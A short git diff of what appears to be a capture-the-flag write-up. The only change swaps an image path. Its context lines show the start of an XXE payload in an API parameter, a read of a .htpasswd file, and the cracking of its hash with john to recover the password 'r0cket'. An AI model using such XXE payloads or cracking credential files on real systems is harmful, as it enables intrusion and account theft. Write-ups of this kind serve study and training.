@@ -157,7 +157,7 @@ manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe S
 
 From here, I wanted to read the `/var/www/developers/.htpasswd` file since we found a password on it earlier.
 
-<figure><img src="../../../.gitbook/assets/image (42) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (42) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Using `john`, we could crack the hash to give `r0cket` as the password. We were confronted with another login page.
 
